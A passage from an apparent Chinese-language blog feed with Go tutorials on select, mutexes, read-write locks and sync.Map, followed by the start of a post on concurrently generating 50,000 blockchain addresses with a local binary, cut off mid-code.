class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>ch2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">100</span>)<br><span class="hljs-comment">// ch1 &lt;- 1</span><br><span class="hljs-comment">// select &#123;</span><br><span class="hljs-comment">// case a := &lt;-ch1:</span><br><span class="hljs-comment">// fmt.Println(&quot;走了第一条，如果ch1里面有元素发送给a的情况下，才会走这条路&quot;, a)</span><br><span class="hljs-comment">// case ch1 &lt;- 5:</span><br><span class="hljs-comment">// fmt.Println(&quot;走了第二条，往ch1里面发送一个元素，如果ch1有位置塞数据的话，就会走这条路&quot;)</span><br><span class="hljs-comment">// default:</span><br><span class="hljs-comment">// fmt.Println(&quot;这是最后一条，如果以上都不满足，就会走这里来。&quot;)</span><br><span class="hljs-comment">// &#125;</span><br>ch2 &lt;- <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> a := &lt;-ch1: <span class="hljs-comment">// 把ch1里的数据发送给a，如果ch1里有数据的话，如果没有就不会触发这条判断</span><br>fmt.Println(<span class="hljs-string">&quot;第一条&quot;</span>, a)<br><span class="hljs-keyword">case</span> ch1 &lt;- <span class="hljs-number">19</span>: <span class="hljs-comment">// ch1接收发送给他的数据19 ， 如果ch1里面还有空位的话，就会触发这一条判断</span><br>fmt.Println(<span class="hljs-string">&quot;走了第二条&quot;</span>)<br><span class="hljs-keyword">case</span> ch2 &lt;- <span class="hljs-number">20</span>: <span class="hljs-comment">// ch2接收发送给他的数据20，如果ch2里面还有空位的话，就会触发这一条判断</span><br>fmt.Println(<span class="hljs-string">&quot;走了第三条&quot;</span>)<br><span class="hljs-keyword">case</span> b := &lt;-ch2: <span class="hljs-comment">// 将ch2里面的数据发送出来给到b，如果ch2里面有数据化，就会触发这一条</span><br>fmt.Println(<span class="hljs-string">&quot;走了第四条&quot;</span>, b)<br><span class="hljs-keyword">default</span>: <span class="hljs-comment">// 注意下，如果上面的通道都无法满足，且没有定义default，那么select就会阻塞 报错select case must be receive, send or assign recv</span><br>fmt.Println(<span class="hljs-string">&quot;都走不通，就会走这条&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 上面这段代码判断里面,第二条第三条第四条都会满足条件，所以会在这三条判断里面随机走一条</span><br>    <span class="hljs-comment">// 如果没有运行case,就会阻塞事件发送报错（死锁）</span><br>    <span class="hljs-comment">// fatal error: all goroutines are asleep - deadlock!</span><br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li>select 应用的场景二：超时处理，结合selcet和time.After函数，事件对某个操作的超时控制，当某个操作超过一定时间没有完成时，可以执行响应的超时处理逻辑，一下两断代码一个基础版一个简单版的，：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 我们开解析下这段代码</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>timeOut := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">// 定义timeOut为chan，内部类型为bool，容积为1，且分配内存（创建timeOut这个通道） </span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;   <span class="hljs-comment">// func()&#123;代码块&#125;()创建匿名函数</span><br>time.Sleep(time.Second * <span class="hljs-number">1</span>) <span class="hljs-comment">//sleep睡1秒钟</span><br>timeOut &lt;- <span class="hljs-literal">true</span> <span class="hljs-comment">// 往timeOut这个通道发送一个数据，数据是ture  （bool）</span><br>&#125;()<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>) <span class="hljs-comment">// / 定义timeOut为chan，内部类型为int，容积为0，无缓冲通道，且分配内存（创建timeOut这个通道） </span><br><span class="hljs-keyword">select</span> &#123; <span class="hljs-comment">//select case</span><br><span class="hljs-keyword">case</span> &lt;-ch1: <span class="hljs-comment">// 第一个case 将ch1通道里面的数据发出来，但是ch1里面是空的，所以没东西发出来所以不会走这条case</span><br><span class="hljs-keyword">case</span> &lt;-timeOut: <span class="hljs-comment">// 第二个case，把timeOut通道里面的数据发出来，因为timeOut里面有个ture这个数据，所以满足，会走这条case </span><br>fmt.Println(<span class="hljs-string">&quot;超时了，走了这一步&quot;</span>) <span class="hljs-comment">// </span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>下面这个是常用的简化版的</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs GO"><span class="hljs-comment">// 简化写一个通俗版，这段代码原理和上面类型，但有个小技巧，我们解读一下</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">// 创建ch1通道，容积为0</span><br>ch1 &lt;- <span class="hljs-number">8</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ch1: <span class="hljs-comment">// 从ch1通道读取数据（把ch1的数据发送出来），ch1为空，不满足该判断</span><br>fmt.Println(<span class="hljs-string">&quot;没有超时就会走这条路&quot;</span>)<br><span class="hljs-keyword">case</span> &lt;-time.After(time.Second * <span class="hljs-number">1</span>): <span class="hljs-comment">// 这里会有疑问的：因为这里的函数time.After()的返回值就是一个有数据的通道，所以满足该case判断</span><br><span class="hljs-comment">// 翻看源码就知道：func After(d Duration) &lt;-chan Time &#123;return NewTimer(d).C &#125;返回的是一个chan类型 Time</span><br>fmt.Println(<span class="hljs-string">&quot;超时1秒且走了这条路&quot;</span>)<br><span class="hljs-comment">// 这里要注意一下，time.After必须要等待时间结束后才会返回一个chan，如果在等待时间内，有其他case满足了，就会去运行其他case.</span><br><br>&#125;<br><span class="hljs-comment">// ch1 &lt;- 8 // 我们试一下往这个ch1里塞一个数据，让他满足第一个case的判断。在Second*1的时间内。满足了第一个case，所以不会运行打印第二个case的内容</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>select 场景三：非阻塞通信，通过定义default语句，实现非阻塞的通信操作，当没有任何通信操作可以立即进行时，default语句会被执行，可以写一下默认逻辑。（判断channel是否阻塞(或者说channel是否已经满了)）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch := <span class="hljs-built_in">make</span> (<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment">// 注意这里给的容量是1</span><br>ch &lt;- <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> ch &lt;- <span class="hljs-number">2</span>:<br><span class="hljs-keyword">default</span>: <span class="hljs-comment">// 走到这里说明select case阻塞了，因为通道满了</span><br>fmt.Println(<span class="hljs-string">&quot;通道channel已经满啦，塞不下东西了!&quot;</span>) <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>slelect场景四：.退出机制</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 解读下这段代码</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>i := <span class="hljs-number">0</span>                      <span class="hljs-comment">// 初始化i 值为1</span><br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">0</span>) <span class="hljs-comment">// 创建一个通道，内容为字符串，容积为0</span><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;              <span class="hljs-comment">// defer main函数结束的时候执行这个方法</span><br><span class="hljs-built_in">close</span>(ch1) <span class="hljs-comment">// 关闭通道</span><br>&#125;()<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; <span class="hljs-comment">// goroutine执行匿名方法</span><br>DONE: <span class="hljs-comment">// DONE:只是在打标签，标记一下循环开始了，没有实际作用</span><br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Second * <span class="hljs-number">1</span>) <span class="hljs-comment">// 暂停一秒</span><br><span class="hljs-comment">// fmt.Println(time.Now().Unix()) // 打印Unix时间戳</span><br>fmt.Println(time.Now().UTC()) <span class="hljs-comment">// 打印UTC国际标准时间</span><br>i++                           <span class="hljs-comment">// 循环一次 加等与1</span><br><br><span class="hljs-keyword">select</span> &#123; <span class="hljs-comment">// 开启select case</span><br><span class="hljs-keyword">case</span> m := &lt;-ch1: <span class="hljs-comment">// 将ch1里面的数据给m变量，但是ch1里是空的，所以不会触发这个</span><br>fmt.Println(<span class="hljs-string">&quot;打印ch1里面的内容 :&quot;</span>, m) <span class="hljs-comment">// 打印接收通道数据的m,就是下面的stop会被塞进来</span><br><span class="hljs-comment">// 这里的DONE也是一个意思标记一下循环从这里结束，收尾呼应</span><br><span class="hljs-keyword">break</span> DONE <span class="hljs-comment">// 当这个通道里面有内容时，结束这个无限循环</span><br><span class="hljs-keyword">default</span>: <span class="hljs-comment">// 没有通道满足case，触发default 打印下面的话</span><br>fmt.Println(<span class="hljs-string">&quot;以上买满足的条件&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>time.Sleep(time.Second * <span class="hljs-number">5</span>)   <span class="hljs-comment">// 会一直等5秒，但是等待的时候，go func匿名函数里面的死循环会一直去循环</span><br>ch1 &lt;- <span class="hljs-string">&quot;stop,塞进通道里面去&quot;</span>         <span class="hljs-comment">// 五秒结束，往 ch1通道里面塞了一个数据 &quot;stop&quot; , ch1里面塞数据的时候，等待到无限循环里面就会被终止的</span><br>fmt.Println(<span class="hljs-string">&quot;看一下这段代码在什么时候执行&quot;</span>) <span class="hljs-comment">// 这个是在循环结束后才会执行</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>强调一下： 要跳出循环，一定要用break+ 具体标记，或者goto 标记也可以，否则其实不是真的退出，因为在goroutine里面，会不停地跑</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>i := <span class="hljs-number">0</span><br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ch)<br>&#125;()<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(<span class="hljs-number">1</span>*time.Second)<br>fmt.Println(time.Now().Unix())<br>i++<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> m := &lt;-ch:<br><span class="hljs-built_in">println</span>(m)<br><span class="hljs-keyword">goto</span> DONE <span class="hljs-comment">// 跳出 select 和 for 循环</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br>DONE:<br>&#125;()<br><br>time.Sleep(time.Second * <span class="hljs-number">4</span>)<br>ch&lt;-<span class="hljs-string">&quot;stop&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><p>锁是一种同步机制，用于控制对共享资源的访问，确保一次只有一个goroutine可以反问共享资源。</p><p>锁有两种状态：锁定和解锁，一旦有一个goroutine获得了锁，那其他goroutines将被阻塞。直到锁被释放</p><p>锁：互斥锁、读写锁</p><h2 id="锁（互斥锁）简单解析"><a href="#锁（互斥锁）简单解析" class="headerlink" title="锁（互斥锁）简单解析"></a>锁（互斥锁）简单解析</h2><p>互斥锁：在并发执行时，多个goroutine同事读写一个数据，就会造成数据的读写混乱，</p><p>解决方式：加锁，加互斥锁，</p><p>方式：控制对共享资源的访问，让它可以却道在任何给定的时刻都只有一个线程或者说goroutine能够访问到被保护的临界区。 </p><p>每一个</p><p>channel通道是解决协程同步，锁是解决协程（线程）访问资源优先性，</p><p>使用互斥锁时一定要注意，对资源（文件、数据等）操作完成</p><p>弊端：加了互斥锁之后，并发就变成了串行了，或者说，走到此处时，是串行，牺牲了效率，但是保证了数据安全性</p><h3 id="互斥锁等待组"><a href="#互斥锁等待组" class="headerlink" title="互斥锁等待组"></a>互斥锁等待组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> x <span class="hljs-type">int</span>             <span class="hljs-comment">// 定义了一个整形变量</span><br><span class="hljs-keyword">var</span> wg sync.WaitGroup <span class="hljs-comment">// 定义了一个等待组WaitGroup</span><br><span class="hljs-keyword">var</span> lock sync.Mutex   <span class="hljs-comment">// 定义了一个Mutex互斥锁</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>lock.Lock() <span class="hljs-comment">// 开启锁</span><br>fmt.Println(<span class="hljs-string">&quot;x开始前为=&quot;</span>, x)<br>x++<br>fmt.Println(<span class="hljs-string">&quot;x此时为=&quot;</span>, x)<br>lock.Unlock() <span class="hljs-comment">// 关闭锁</span><br>&#125;<br>wg.Done() <span class="hljs-comment">// 通知等待组wg完成了</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;x=&quot;</span>, x)<br>wg.Add(<span class="hljs-number">2</span>) <span class="hljs-comment">// 等待组添加了2个 就是把两个goroutine放进等待组里面，他们两个在抢锁</span><br><span class="hljs-comment">// 两个add方法都在同时运行，但是只有一把锁，谁拿到了锁就是谁在执行x++的这个操作</span><br><span class="hljs-keyword">go</span> add()<br><span class="hljs-keyword">go</span> add()<br><span class="hljs-comment">// go add()</span><br>wg.Wait() <span class="hljs-comment">// 等待组进入等待状态，等这两个goroutines完成任务</span><br>fmt.Println(x)<br>&#125;<br><span class="hljs-comment">// 输出为2000 </span><br></code></pre></td></tr></table></figure><h2 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h2><ul><li>场景：读多写少，读是不需要加锁的，写需要加锁</li><li>解决：读写互斥锁</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">- 当一个goroutine获取读锁之后，其他的goroutine如果是获取读锁会继续获得锁，如果是获取写锁，就会等待；<br>- 当一个<span class="hljs-string">`goroutine`</span>获取写锁之后，其他的<span class="hljs-string">`goroutine`</span>无论是获取读锁还是写锁都会等待<br></code></pre></td></tr></table></figure><h2 id="sync-Map-并发安全映射（Map）"><a href="#sync-Map-并发安全映射（Map）" class="headerlink" title="sync.Map 并发安全映射（Map）"></a>sync.Map 并发安全映射（Map）</h2><ul><li>Go内置的map 并不是并发安全的，所以高并发下使用sync.Map类型</li><li>sync.Map不需要使用make()分配内存，使用另一种便捷方式：Store&#x2F;Load等</li></ul><p>1、并发安全性：<code>sync.Map</code> 在多个goroutines之间提供了并发安全的读取和写入操作，这意味着你可以同时在多个goroutines中访问和修改同一个映射，而不需要额外的锁或者同步机制去限制</p><p>2、自动扩容：<code>sync.map</code>在需要时会自动扩容以适应更多的键值对，无需手动管理容量问题</p><p>3、性能优化：<code>sync.map</code>在内部使用了一些性能优化策略，以提高并发访问的性能</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// // 写入键值对</span><br><span class="hljs-comment">// m.Store(&quot;key1&quot;, &quot;value1&quot;)</span><br><span class="hljs-comment">// m.Store(&quot;key2&quot;, &quot;value2&quot;)</span><br><br><span class="hljs-comment">// // 读取键的值</span><br><span class="hljs-comment">// value, found := m.Load(&quot;key1&quot;)</span><br><span class="hljs-comment">// if found &#123;</span><br><span class="hljs-comment">// fmt.Println(&quot;Value:&quot;, value)</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// // 删除键值对</span><br><span class="hljs-comment">// // m.Delete(&quot;key2&quot;)</span><br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123; <span class="hljs-comment">// 循环10次，10个goroutine</span><br>wg3.Add(<span class="hljs-number">1</span>) <span class="hljs-comment">// 添加等待组，添加1个，循环了i遍</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(n <span class="hljs-type">int</span>)</span></span> &#123;<br>key := strconv.Itoa(n) <span class="hljs-comment">//将n转化成字符串，用key接收，Itoa转换</span><br>m.Store(key, n)        <span class="hljs-comment">// 组装一个sync.Map 键是kyc字符串，值是n，所以就是 &quot;1&quot;:1这样的形式</span><br><span class="hljs-comment">//读取sync,Mao的内容，通过Key拿值，</span><br><span class="hljs-comment">// 下划线表示不处理那个返回值，Load会返回两个值，前面的是kyc对应的value，后面的是一个布尔值，有就真，无就假</span><br>value, _ := m.Load(key)<br>fmt.Println(value) <span class="hljs-comment">//打印的是key 的值</span><br>wg3.Done()         <span class="hljs-comment">// 结束这个等待组</span><br><br>&#125;(i)<br>wg3.Wait() <span class="hljs-comment">// 等待所有等待组完成</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Golang】go语言批量生成5W地址</title>
    <link href="/2023/12/07/808go%E8%AF%AD%E8%A8%80%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%905W%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/12/07/808go%E8%AF%AD%E8%A8%80%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%905W%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="基于go语言编写批量生成用户地址"><a href="#基于go语言编写批量生成用户地址" class="headerlink" title="基于go语言编写批量生成用户地址"></a>基于go语言编写批量生成用户地址</h1><p>1、执行二进制</p><p>2、切分数据</p><p>3、创建<code>goroutine</code>并发执行</p><p>go语言需要创建结构体去接收数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/csv&quot;</span><br><span class="hljs-string">&quot;gopkg.in/yaml.v3&quot;</span><br><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-comment">//&quot;gopkg.in/yaml.v3&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br><span class="hljs-comment">// Execute binary file</span><br>binaryPath  = <span class="hljs-string">&quot;/home/wang/code/pressure-me/me-chaind&quot;</span><br>userChan    = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> User, <span class="hljs-number">100000</span>)<br>outputMutex sync.Mutex<br>dirPath     = <span class="hljs-string">&quot;--home=./me-chain&quot;</span><br>csvName     = <span class="hljs-string">&quot;users.csv&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id         <span class="hljs-type">string</span><br>Address    <span class="hljs-type">string</span><br>PrivateKey <span class="hljs-type">string</span><br>Mnemonic   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> addResponse <span class="hljs-keyword">struct</span> &#123;<br>Name     <span class="hljs-type">string</span><br>Type     <span class="hljs-type">string</span><br>Address  <span class="hljs-type">string</span><br>Pubkey   <span class="hljs-type">string</span><br>Mnemonic <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewUser</span><span class="hljs-params">(id <span 